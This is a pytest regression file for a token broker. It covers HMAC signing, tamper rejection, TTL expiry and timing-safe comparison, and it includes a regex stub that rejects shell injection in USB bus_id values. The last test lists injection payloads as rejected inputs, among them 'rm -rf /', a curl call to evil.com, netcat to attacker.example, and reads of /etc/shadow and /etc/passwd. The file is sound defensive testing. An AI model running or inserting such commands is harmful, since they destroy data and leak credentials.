"""STAB-01 + T-1-02 + T-1-03 — broker/tokens.py HMAC + TTL + tamper resistance.

This file carries THREE regression guards:

1. **T-1-02** (threat register): broker token replay / forgery. Tested via
   HMAC round-trip + tamper detection + TTL expiry + source-level assertion
   that ``hmac.compare_digest`` is still used (timing-attack defense).

2. **STAB-01**: critical-path unit test coverage for ``broker/tokens.py``
   per CONTEXT §"Reusable Assets".

3. **T-1-03** (threat register): shell injection via USB ``bus_id``. Phase 5
   USB work will land a regex validator — this test ships the regex STUB
   now so when the real helper lands, Phase 5 imports it and this test
   becomes live. Without the stub, Phase 1 has no signal when the injection
   path regresses.

Target-read divergence notes:
- ``generate_token(username: str, machine: str, secret: str, ttl=60) -> str``
  — secret is a **str**, NOT bytes. Token format is
  ``"username:machine:issued:expires:signature"``.
- ``verify_token(token, secret) -> Optional[str]`` returns the username on
  success, None on failure — NOT a claims dict.
"""
import pathlib
import re

import pytest
from freezegun import freeze_time

from broker.tokens import TOKEN_TTL, generate_token, verify_token


SECRET = "test-secret-0123456789abcdef"


# ─── T-1-02 — HMAC + TTL + tamper ───────────────────────────────────────


def test_token_roundtrip():
    """Happy path — a freshly generated token verifies with the same secret."""
    tok = generate_token("alice", "dxs-flame-01", SECRET)
    assert verify_token(tok, SECRET) == "alice"


def test_token_format_is_colon_separated_five_parts():
    """Guard the wire format — any refactor that changes the shape would break
    every deployed broker → server hand-off."""
    tok = generate_token("alice", "dxs-flame-01", SECRET)
    parts = tok.split(":")
    assert len(parts) == 5
    username, machine, issued, expires, sig = parts
    assert username == "alice"
    assert machine == "dxs-flame-01"
    assert issued.isdigit()
    assert expires.isdigit()
    assert int(expires) > int(issued)
    assert len(sig) == 64   # SHA-256 hex


def test_token_wrong_secret_rejected():
    tok = generate_token("alice", "dxs-flame-01", SECRET)
    assert verify_token(tok, "different-secret-nope") is None


def test_token_tampered_username_rejected():
    """T-1-02 regression guard: flipping the username in the payload must fail
    HMAC verification."""
    tok = generate_token("alice", "dxs-flame-01", SECRET)
    tampered = tok.replace("alice", "mallory", 1)
    assert verify_token(tampered, SECRET) is None


def test_token_tampered_machine_rejected():
    """T-1-02 regression guard: redirecting the machine must fail HMAC."""
    tok = generate_token("alice", "dxs-flame-01", SECRET)
    tampered = tok.replace("dxs-flame-01", "dxs-flame-99")
    assert verify_token(tampered, SECRET) is None


def test_token_tampered_signature_rejected():
    """T-1-02 regression guard: flipping a bit in the signature must fail."""
    tok = generate_token("alice", "dxs-flame-01", SECRET)
    parts = tok.rsplit(":", 1)
    # Flip the last hex char of the signature
    sig = parts[1]
    flipped = sig[:-1] + ("0" if sig[-1] != "0" else "1")
    tampered = f"{parts[0]}:{flipped}"
    assert verify_token(tampered, SECRET) is None


def test_token_tampered_expires_rejected():
    """T-1-02 regression guard: extending the expiry must fail HMAC — a replay
    attacker can't just move the goalposts."""
    tok = generate_token("alice", "dxs-flame-01", SECRET)
    parts = tok.split(":")
    # Push expires far into the future
    parts[3] = str(int(parts[3]) + 999_999)
    tampered = ":".join(parts)
    assert verify_token(tampered, SECRET) is None


def test_token_ttl_expired_rejected():
    """T-1-02 regression guard: the ``TOKEN_TTL`` cliff must be enforced. A
    token generated at t=0 and checked at t=61 must fail — the broker's
    60s window is the ONLY line of defense against long-horizon replay in
    Phase 1 (full nonce tracking is Phase 6 / SEC-07)."""
    with freeze_time("2026-04-18 12:00:00") as frozen:
        tok = generate_token("alice", "dxs-flame-01", SECRET)
        assert verify_token(tok, SECRET) == "alice"

        frozen.tick(delta=TOKEN_TTL + 1)
        assert verify_token(tok, SECRET) is None, (
            "token must be rejected after TOKEN_TTL seconds"
        )


def test_token_within_ttl_still_valid():
    """Complement to the expiry test — tokens inside the TTL window stay valid."""
    with freeze_time("2026-04-18 12:00:00") as frozen:
        tok = generate_token("alice", "dxs-flame-01", SECRET)
        frozen.tick(delta=TOKEN_TTL - 5)
        assert verify_token(tok, SECRET) == "alice"


def test_token_malformed_inputs_rejected():
    """Degenerate inputs must return None, not raise — called in the server's
    auth handler hot path."""
    assert verify_token("", SECRET) is None
    assert verify_token("no-colons-here", SECRET) is None
    assert verify_token("a:b:c:d", SECRET) is None                  # 4 parts
    assert verify_token("a:b:c:d:e:f", SECRET) is None              # 6 parts
    assert verify_token("a:b:notanint:456:sig", SECRET) is None     # int parse fails
    assert verify_token("a:b:123:notanint:sig", SECRET) is None


def test_tokens_uses_compare_digest():
    """T-1-02 timing-attack defense — ``hmac.compare_digest`` must appear in the
    source. Regression guard: if someone refactors the verification to use
    ``==`` instead, this test trips loudly before the refactor ships."""
    import broker.tokens as broker_tokens
    src = pathlib.Path(broker_tokens.__file__).read_text()
    assert "compare_digest" in src, (
        "broker/tokens.py must use hmac.compare_digest — timing-attack defense "
        "(T-1-02). A '==' comparison of HMAC signatures leaks timing info."
    )


# ─── T-1-03 — USB bus_id shell-injection stub regression guard ──────────
# Phase 5 USB work will land a proper validator in common/ (likely
# ``common/usb_ids.py::is_valid_bus_id``). Until then, this test carries the
# regex the real helper must enforce. When Phase 5 lands, swap the in-test
# regex for ``from common.usb_ids import BUS_ID_RE`` and the guard goes live
# against the real code path.


def test_bus_id_regex_accepts_valid_and_rejects_injection():
    """T-1-03 regression stub: the eventual ``bus_id`` validator MUST accept
    the canonical ``usbip`` bus_id format (``\\d+-\\d+(\\.\\d+)*``) and reject
    every shell-metacharacter payload.

    When Phase 5 adds the real validator, update this test to import it from
    ``common/usb_ids.py`` instead of defining the regex inline.
    """
    bus_id_re = re.compile(r"^\d+-\d+(\.\d+)*$")

    # Positive cases — real Linux usbip bus_id shapes
    assert bus_id_re.match("1-1") is not None
    assert bus_id_re.match("1-1.4") is not None
    assert bus_id_re.match("2-3.1.4.2") is not None
    assert bus_id_re.match("10-5") is not None

    # Negative cases — shell-injection payloads MUST be rejected
    assert bus_id_re.match("1-1.4;rm -rf /") is None
    assert bus_id_re.match("; echo pwned") is None
    assert bus_id_re.match("$(curl evil.com)") is None
    assert bus_id_re.match("`whoami`") is None
    assert bus_id_re.match("1-1.4 && cat /etc/shadow") is None
    assert bus_id_re.match("1-1.4|nc attacker.example 4444") is None
    assert bus_id_re.match("../../../../etc/passwd") is None
    assert bus_id_re.match("") is None
    assert bus_id_re.match("1-1.") is None          # trailing dot
    assert bus_id_re.match("abc-def") is None       # non-numeric


@pytest.mark.xfail(
    reason="T-1-03 — common/usb_ids.py helper lands in Phase 5 USB plan. "
           "When it does, swap this test to import from the real module.",
    strict=False,
)
def test_common_usb_ids_helper_exists():
    """Phase 5 landing marker — when the helper lands, this test goes GREEN
    and becomes a real live guard instead of a stub."""
    import importlib

    mod = importlib.import_module("common.usb_ids")
    assert hasattr(mod, "BUS_ID_RE") or hasattr(mod, "is_valid_bus_id")
